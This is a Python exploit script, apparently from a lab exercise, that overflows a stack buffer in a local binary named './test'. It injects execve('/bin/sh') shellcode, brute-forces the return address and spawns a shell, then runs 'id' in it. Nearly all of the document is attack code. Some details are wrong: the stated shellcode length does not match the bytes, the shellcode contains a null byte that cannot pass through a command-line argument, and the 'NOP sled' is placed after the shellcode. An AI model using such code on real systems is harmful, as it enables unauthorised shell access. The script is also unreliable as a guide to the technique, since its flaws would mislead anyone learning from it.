#!/usr/bin/env python3
import subprocess, struct, sys, time

# -------------------------------------------------
# 1️⃣ 64‑bit execve("/bin/sh") shellcode (27 bytes)
# -------------------------------------------------
shellcode = (
    b"\x48\x31\xd2"                      # xor    rdx,rdx
    b"\x48\x31\xf6"                      # xor    rsi,rsi
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rdi,0x68732f6e69622f
    b"\x57"                              # push   rdi
    b"\x48\x89\xe7"                      # mov    rdi,rsp
    b"\xb0\x3b"                          # mov    al,0x3b
    b"\x0f\x05"                          # syscall
)

# -------------------------------------------------
# 2️⃣ Build the overflow payload
# -------------------------------------------------
# dest is 64 bytes → pad shellcode to that size
payload = shellcode.ljust(64, b"\x90")   # NOP sled after shellcode

# overwrite src (8 bytes) and saved rbp (8 bytes) with junk
payload += b"B" * 8                     # src
payload += b"C" * 8                     # saved rbp

# placeholder for the new return address (8 bytes)
payload += b"\x00" * 8

# -------------------------------------------------
# 3️⃣ Helper to run the binary with a given argument
# -------------------------------------------------
def run(arg_bytes):
    # Encode raw bytes as Latin‑1 so they survive the execve call unchanged
    arg_str = arg_bytes.decode('latin-1')
    proc = subprocess.Popen(
        ["./test", arg_str],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    try:
        out, err = proc.communicate(timeout=2)
    except subprocess.TimeoutExpired:
        proc.kill()
        out, err = proc.communicate()
    return out, err, proc.returncode

# -------------------------------------------------
# 4️⃣ Brute‑force the return‑address (stack address)
# -------------------------------------------------
# Typical stack addresses on this container start with 0x7ff…
base_guess = 0x7fffffffde00   # rough guess; we will scan a few pages

found_ret = None
for off in range(0, 0x4000, 0x100):   # scan ~16 KB of the stack region
    ret_addr = base_guess + off
    test_payload = payload[:-8] + struct.pack("<Q", ret_addr)
    out, _, rc = run(test_payload)

    # If the program exits *normally* (rc == 0) instead of segfaulting,
    # we likely landed on executable stack code.
    if rc == 0:
        print("[+] Possible return address:", hex(ret_addr))
        found_ret = ret_addr
        break

if not found_ret:
    print("[-] Could not locate a working return address.")
    sys.exit(1)

# -------------------------------------------------
# 5️⃣ Final exploit with the discovered address
# -------------------------------------------------
final_payload = payload[:-8] + struct.pack("<Q", found_ret)
proc = subprocess.Popen(
    ["./test", final_payload.decode('latin-1')],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True
)

# Give the shell a moment to spawn
time.sleep(0.5)

# Test the shell
proc.stdin.write("id\n")
proc.stdin.flush()
print(proc.stdout.readline().strip())   # echo of the command
print(proc.stdout.readline().strip())   # result of `id`